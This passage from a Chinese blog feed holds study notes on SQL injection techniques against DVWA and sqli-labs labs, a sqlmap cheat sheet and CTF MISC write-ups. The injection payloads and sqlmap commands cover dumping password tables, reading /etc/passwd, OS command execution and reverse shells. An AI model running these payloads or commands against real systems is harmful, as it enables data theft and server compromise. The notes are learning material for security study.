-- +<br></code></pre></td></tr></table></figure><p>用 <code>IFNULL()</code> 函数</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/sqli/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; and IFNULL((substr((select user()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;r&#x27;),<span class="hljs-number">0</span>) -- +<br></code></pre></td></tr></table></figure><p>使用 比较函数<code>strcmp()</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.<br><br><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/sqli/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; and strcmp((substr((select user()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;r&#x27;),<span class="hljs-number">1</span>) -- +<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/sqli/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; and strcmp((substr((select user()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;r&#x27;),<span class="hljs-number">0</span>) -- +<br><br><br><span class="hljs-attribute">2</span>.<br><br><span class="hljs-attribute">mysql</span>&gt; select * from users where id =<span class="hljs-number">1</span> and <span class="hljs-number">0</span>=strcmp((substr((select user()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)),&#x27;o&#x27;);<br><span class="hljs-attribute">Empty</span> set (<span class="hljs-number">0</span>.<span class="hljs-number">00</span> sec)<br><br><span class="hljs-attribute">mysql</span>&gt; select * from users where id =<span class="hljs-number">1</span> and <span class="hljs-number">0</span>=strcmp((substr((select user()),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)),&#x27;o&#x27;);<br><br></code></pre></td></tr></table></figure><h2 id="关于Union联合注入的问题"><a href="#关于Union联合注入的问题" class="headerlink" title="关于Union联合注入的问题"></a>关于Union联合注入的问题</h2><p><code>? id=1 union select user,pwd from wp_user;</code><br>可能MySQL确实查询出了两行记录，但是PHP代码决定了页面只显示一行代码</p><p>可以在原有数据后面加上<code>limit 1,1</code> （是一个条件限制，作用是取查询结果第一条记录后的一条记录）<br><code>? id=1 union select user,pwd from wp_user limit 1,1;</code> </p><p>也可以指定id=-1或者一个很大的值，使得第一行记录无法被查到，这样结果就只有UNION的查询结果了</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">1</span>.没使用宽字节<br><span class="hljs-variable">%27</span> -&gt; <span class="hljs-variable">%5</span>C<span class="hljs-variable">%27</span> <br><br><span class="hljs-number">2</span>. 试用宽字节<br><span class="hljs-variable">%df</span><span class="hljs-variable">%27</span> -&gt; <span class="hljs-variable">%df</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%27</span> -&gt; 運&#x27;<br></code></pre></td></tr></table></figure><ol><li>在我们输入单引号时 <code>addslashes()</code> 或者<code>get_magic_quotes_gpc</code> 给我们的单引号加入了转义字符<code>\</code> 就变成了<code>\&#39;</code></li><li>我们输入经过转换后由于编码的不同把<code>%df%5c</code> 转换为了一个汉字。</li></ol><h2 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h2><p>1、检测漏洞<br>python sqlmap.py -u “<a href="http://127.0.0.1/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;">http://127.0.0.1/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;</a><br>大部分情况下的网站是可以直接这样的<br>但是dvwa需要登录，所以需要添加cookie信息</p><p>cookie信息怎么看：</p><img class="url&#x3D;&#x2F;picture&#x2F;web1.png"><p>python sqlmap.py -u “<a href="http://127.0.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://127.0.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie =”security=low; PHPSESSID=13nt494nnep4ge910t9d0tq91o”</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment">#摘自冰河博客</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--current-user</span> <span class="hljs-comment">#获取当前用户名称</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--current-db</span> <span class="hljs-comment">#获取当前数据库名称</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--tables</span> -D <span class="hljs-string">&quot;db_name&quot;</span> <span class="hljs-comment">#列表名</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--columns</span> -T <span class="hljs-string">&quot;tablename&quot;</span> users-D <span class="hljs-string">&quot;db_name&quot;</span> -v 0 <span class="hljs-comment">#列字段</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--dump</span> -C <span class="hljs-string">&quot;column_name&quot;</span> -T <span class="hljs-string">&quot;table_name&quot;</span> -D <span class="hljs-string">&quot;db_name&quot;</span> -v 0 <span class="hljs-comment">#获取字段内容</span><br>******************信息获取****************** <br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--smart</span> <span class="hljs-params">--level</span> 3 <span class="hljs-params">--users</span> <span class="hljs-comment"># smart 智能 level 执行测试等级</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--dbms</span> <span class="hljs-string">&quot;Mysql&quot;</span> <span class="hljs-params">--users</span> <span class="hljs-comment"># dbms 指定数据库类型</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--users</span> <span class="hljs-comment">#列数据库用户</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--dbs</span><span class="hljs-comment">#列数据库</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--passwords</span> <span class="hljs-comment">#数据库用户密码</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--passwords-U</span> root -v 0 <span class="hljs-comment">#列出指定用户数据库密码</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--dump</span> -C <span class="hljs-string">&quot;password,user,id&quot;</span> -T <span class="hljs-string">&quot;tablename&quot;</span> -D <span class="hljs-string">&quot;db_name&quot;</span> <span class="hljs-params">--start</span> 1 <span class="hljs-params">--stop</span> 20 <span class="hljs-comment">#列出指定字段，列出 20 条</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--dump-all</span> -v 0 <span class="hljs-comment">#列出所有数据库所有表</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--privileges</span> <span class="hljs-comment">#查看权限</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--privileges</span> -U root <span class="hljs-comment">#查看指定用户权限</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--is-dba</span> -v 1 <span class="hljs-comment">#是否是数据库管理员</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--roles</span> <span class="hljs-comment">#枚举数据库用户角色</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--udf-inject</span> <span class="hljs-comment">#导入用户自定义函数（获取系统权限！）</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--dump-all</span> <span class="hljs-params">--exclude-sysdbs</span> -v 0 <span class="hljs-comment">#列出当前库所有表</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--union-cols</span> <span class="hljs-comment">#union 查询表记录</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;COOKIE_VALUE&quot;</span> <span class="hljs-comment">#cookie 注入</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> -b <span class="hljs-comment">#获取 banner 信息</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;id=3&quot;</span> <span class="hljs-comment">#post 注入</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> -v 1 -f <span class="hljs-comment">#指纹判别数据库类型</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--proxy</span><span class="hljs-string">&quot;http://127.0.0.1:8118&quot;</span> <span class="hljs-comment">#代理注入</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span><span class="hljs-params">--string</span><span class="hljs-string">&quot;STRING_ON_TRUE_PAGE&quot;</span> <span class="hljs-comment">#指定关键词</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--sql-shell</span> <span class="hljs-comment">#执行指定 sql 命令</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--file</span> <span class="hljs-string">/etc/passwd</span>  <span class="hljs-comment">#必须为dbs权限</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--file-write</span> 本地文件路径 file-dest 目标路径  <span class="hljs-comment">#必须为dbs权限(可将本地的某个文件写入到目标路径下)</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--os-cmd=whoami</span> <span class="hljs-comment">#执行系统命令</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--os-shell</span> <span class="hljs-comment">#系统交互 shell</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--os-pwn</span> <span class="hljs-comment">#反弹 shell</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--reg-read</span> <span class="hljs-comment">#读取 win 系统注册表</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--dbs-o</span> <span class="hljs-string">&quot;sqlmap.log&quot;</span> <span class="hljs-comment">#保存进度</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--dbs</span> -o <span class="hljs-string">&quot;sqlmap.log&quot;</span> <span class="hljs-params">--resume</span> <span class="hljs-comment">#恢复已保存进度</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--msf-path=/opt/metasploit3/msf2</span> <span class="hljs-params">--os-pwn</span> 反弹 shell 需 metasploit 路径<br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--tamper</span> <span class="hljs-string">&quot;base64encode.py&quot;</span> 加载脚本<span class="hljs-params">(可利用绕过注入限制)</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--batch</span> <span class="hljs-params">--tamper</span> <span class="hljs-string">&quot;base64encode.py&quot;</span> 加载脚本<span class="hljs-params">(可利用绕过注入限制)</span><br>sqlmap -g <span class="hljs-string">&quot;google 语法&quot;</span> <span class="hljs-params">--dump-all</span> <span class="hljs-params">--batch</span> <span class="hljs-comment">#google 搜索注入点自动 跑出所有字段</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--forms</span>  <span class="hljs-comment">#post提交方式注入</span><br>sqlmap.py -r 本地数据包路径 <span class="hljs-comment">#post提交方式注入</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;还是有点乱，有时间会把弄好的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;常见的SQL注入有数字型注入、Union注入、字符型注入、布尔盲注、时间注入、报错注入和堆叠注入&lt;/p&gt;
&lt;p&gt;浏览器会自动将URI中的特殊字符进行URL编码，服务器收到请求后</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>sql注入和sqlmap的使用</title>
    <link href="https://zhangkaibin0921.github.io/2022/03/17/sql%E6%B3%A8%E5%85%A5/"/>
    <id>https://zhangkaibin0921.github.io/2022/03/17/sql%E6%B3%A8%E5%85%A5/</id>
    <published>2022-03-17T14:25:01.000Z</published>
    <updated>2022-04-02T03:36:48.541Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>还是有点乱，有时间会把弄好的</p></blockquote><p>常见的SQL注入有数字型注入、Union注入、字符型注入、布尔盲注、时间注入、报错注入和堆叠注入</p><p>浏览器会自动将URI中的特殊字符进行URL编码，服务器收到请求后会自动进行URL解码</p><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p><code>SELECT username, password FROM users WHERE username=&#39;&#39; or 1=1 -- AND password=&#39;anything</code><br>用户的输入用户名为<code>&#39; or 1=1 --</code>，密码为任意值即可</p><h2 id="information-schema数据库"><a href="#information-schema数据库" class="headerlink" title="information_schema数据库"></a>information_schema数据库</h2><p><img src="/picture/web19.png"></p><p>1、查看数据库名<br><code>select schema_name from information_schema.schemata;</code></p><p>2、查看表名<br><code>select table_name from information_schema.tables where table_schema=&#39;security&#39;;</code><br>这个security是上一步查出来的数据库名称</p><p>3、查看列名<br><code>select column_name from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;;</code><br>users是上一步查出来的表名</p><p>4、查数据<br><code>select username,password from security.users;</code><br>username和password是一步查出来的列名</p><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><p>1、<code>?id=1&#39;</code>  加单引号输出错误<br>2、<code>?id=1 and 1=1</code> 输出正常<br>3、<code>?id=1 and 1=2</code> 输出错误<br>则存在数字型注入漏洞(或直接通过id=3-1和id=2的回显页面一致，判断这里存在数字型注入)</p><p>4、然后通过联合查询，查询到本数据库的其他所有表名<br><code>?id=-1 union select 1,group_concat(table_name) from information_schema,tables where table_schema=database()</code><br>table_name字段是information_schema库中tables表的表名字段，表中还有数据库名字段table_schema。database()函数返回的内容是当前数据库的名称。group_contact是用<code>，</code>联合多行记录的函数，也就是说该语句可以联合查询当前库的所有（事实上有一定长度限制）表名并显示在一个字段中。</p><p>5、通过columns表及其中的column_name查询出的内容即为wp_user（上一步查询出的一个表名）中的字段名<br><code>?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;wp_user&#39;</code></p><h2 id="字符型注入流程"><a href="#字符型注入流程" class="headerlink" title="字符型注入流程"></a>字符型注入流程</h2><p>1、判断是否存在注入点<br>先输入一个单引号，看页面是否错误输出，如果错误输出，继续进行下一步(或者 id=3-1观察页面是否为空再<br>id=2a观察页面是否有结果，如果有，那么多半就是字符型)</p><p>SELECT  first_name,last_name  FROM users WHERE  user_id=’<font color='red'>1’ and 1=1#</font>‘<br>用户输入的数据为<font color=red>1’ and 1=1#</font></p><p>SELECT  first_name,last_name  FROM users WHERE  user_id=’<font color='red'>1’ and 1=2#</font>‘<br>用户输入的数据为<font color=red>1’ and 1=2#</font></p><p>两次尝试后1=1正常输出，1=2错误输出，证明SQL语句生效，存在SQL注入漏洞</p><p>尝试使用单引号来闭合前面的单引号，再用<code>--%20</code>或<code>%23</code>注释后面的语句。这里一定要用<strong>url编码，空格的编码是%20,   #的编码是%23<br>id=2%27%23</strong><br><code>where id=&#39;1&#39;#&#39; </code>  此时的MySQL语句</p><p>2、判断数据库列数  order by [column_num]</p><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 1 #</font>‘<br>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 2 #</font>‘<br>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 3 #</font>‘ </p><p>当表中只有两列，order by 3就会出错</p><p>3、联合查询其他信息  union select [sql1] [sql2]</p><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union  select  user(),database()#</font>‘<br>用户输入的SQL语句，执行了MYSQL内置函数user()和database(),user()返回当前数据库连接用户，database()返回当前数据库名称</p><p>4、联合查询表  union select  table_name,table_schema  from  information_schema.tables  where table_schema= ‘[database_name]’</p><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union select table_name,table_schema  from  information_schema.tables  where  table_schema=’dvwa’#</font>‘<br>从information_schema数据库中查询dvwa数据库表<br>这一步是为了查询数据库中有哪些表，因为上一步查到了数据库的名称,这个dvwa就是上一步查询到的数据库的名称。我们想要看看这个数据库里面有什么东西，除了数据库名称根据实际进行更改，其他内容是固定不变的。</p><p>5、联合查询信息  union [query_sql]</p><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union  select user,password  from  users#</font>‘<br>上一步查询到数据库中有哪些表，现在想要查看表中的内容。假设这里的users就是上一步中查到的表，猜测可能会有user和password这两个属性，查询user和password的值</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h4 id="各数据库在字符串处理时的区别"><a href="#各数据库在字符串处理时的区别" class="headerlink" title="各数据库在字符串处理时的区别"></a>各数据库在字符串处理时的区别</h4><p><img src="/picture/sql1.png"></p><p><code>id=1&#39; and (ascii(substr(database(),1,1))=115)=1%23 </code>由于数据库第一位s的ascii值为115，就构造出1=1的结构，页面正常</p><h4 id="limit使用"><a href="#limit使用" class="headerlink" title="limit使用"></a>limit使用</h4><p><code>select * from table limit m,n;</code><br>注意这里的m是从0开始，得到第一张表需要用到limit 0,1</p><h2 id="关于Union联合注入的问题"><a href="#关于Union联合注入的问题" class="headerlink" title="关于Union联合注入的问题"></a>关于Union联合注入的问题</h2><p><code>? id=1 union select user,pwd from wp_user;</code><br>可能MySQL确实查询出了两行记录，但是PHP代码决定了页面只显示一行代码</p><p>可以在原有数据后面加上<code>limit 1,1</code> （是一个条件限制，作用是取查询结果第一条记录后的一条记录）<br><code>? id=1 union select user,pwd from wp_user limit 1,1;</code> </p><p>也可以指定id=-1或者一个很大的值，使得第一行记录无法被查到，这样结果就只有UNION的查询结果了</p><h2 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h2><p>1、检测漏洞<br>python sqlmap.py -u “<a href="http://127.0.0.1/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;">http://127.0.0.1/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;</a><br>大部分情况下的网站是可以直接这样的<br>但是dvwa需要登录，所以需要添加cookie信息</p><p>cookie信息怎么看：</p><img class="url&#x3D;&#x2F;picture&#x2F;web1.png"><p>python sqlmap.py -u “<a href="http://127.0.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://127.0.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie =”security=low; PHPSESSID=13nt494nnep4ge910t9d0tq91o”</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;还是有点乱，有时间会把弄好的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;常见的SQL注入有数字型注入、Union注入、字符型注入、布尔盲注、时间注入、报错注入和堆叠注入&lt;/p&gt;
&lt;p&gt;浏览器会自动将URI中的特殊字符进行URL编码，服务器收到请求后</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>buu-MISC第一页</title>
    <link href="https://zhangkaibin0921.github.io/2022/03/09/buu-MISC%E7%AC%AC%E4%B8%80%E9%A1%B5/"/>
    <id>https://zhangkaibin0921.github.io/2022/03/09/buu-MISC%E7%AC%AC%E4%B8%80%E9%A1%B5/</id>
    <published>2022-03-09T06:25:48.000Z</published>
    <updated>2022-03-09T06:27:37.665Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>如果大家有任何问题，都可以随时问我，我也是刚入坑不久的小白，大家共同进步</p></blockquote><hr><h2 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h2><p>拿到gif，放进stegsolve看frame<br><img src="https://img-blog.csdnimg.cn/5681e0c66b634af59718351f4255f1f7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_11,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>拼接得到flag</p><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>扫二维码得到<br><img src="https://img-blog.csdnimg.cn/e4eb648093874f7095892516ff5487d8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>丢进010editor<br><img src="https://img-blog.csdnimg.cn/46e05d92ef164ec79fcc1101a46ac7c8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>看到zip，导出<img src="https://img-blog.csdnimg.cn/06590841b81141a38e4a230533ef6b71.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>zip有密码，提示是4位，archpr爆破即可</p><h2 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h2><p><img src="https://img-blog.csdnimg.cn/ab0c6b14aedd403fa55de622d125f9d2.png" alt="在这里插入图片描述"><br>010editor文件尾看到flag</p><h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><p>给了KEY.exe<br>双击打不开<br>丢进Exeinfo PE里面<br><img src="https://img-blog.csdnimg.cn/34787e1187454e879f4cdb5a1c46a286.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>放进010editor<br><img src="https://img-blog.csdnimg.cn/7321e3ffa74540a888aa3153b3789574.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>base64转图片<br><img src="https://img-blog.csdnimg.cn/16f81778221d4d9591f1ed76213ae9c7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>扫码得flag</p><h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p>题目提示屏幕太小了<br>改宽高</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#crc爆破宽高的脚本</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> struct<br>crcbp=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.png&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2048</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2048</span>):<br>        data=crcbp[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>]+struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>,i)+struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>,j)+crcbp[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]<br>        crc32=binascii.crc32(data)&amp;<span class="hljs-number">0xffffffff</span><br>        <span class="hljs-keyword">if</span> crc32== <span class="hljs-number">0x00BF122A</span>:  <span class="hljs-comment">#这里的值也需要根据图片的crc值进行更改</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i),<span class="hljs-built_in">hex</span>(j))<br><br></code></pre></td></tr></table></figure><p>我这里直接尝试着改高度<br><img src="https://img-blog.csdnimg.cn/575d73ddb1d0487da6980c9fdb0ebfff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p> 改成2<br> <img src="https://img-blog.csdnimg.cn/3a0783b6664945d39e0e3317c54b33eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这里给大家推荐一个工具quicker，直接OCR截图识别，还是很方便常用的</p><h2 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h2><p>题目提示4位密码，archpr爆破的密码<br>得到ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30=<br>base64解码得flag</p><h2 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h2><p><img src="https://img-blog.csdnimg.cn/46bb22b542ea48048695592509070fbe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>010editor打开，又在文件尾</p><h2 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h2><p>这题，我是真的菜<br>前面几题都有记得看exif，这题没有，没写出来，哈哈<br>答案在exif里面<br><img src="https://img-blog.csdnimg.cn/1b8e279c9a024c48816b144a05f22ee1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>一直在研究这串数字，觉得这串数字不太对劲<br>md5、十六进制转字符不对<br>想想是不是7位ASCII转换，发现也不太像<br>毫无头绪<br>没想到就是这串数字，套上flag</p><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>丢进wireshark<br>直接搜flag<br>tcp contains 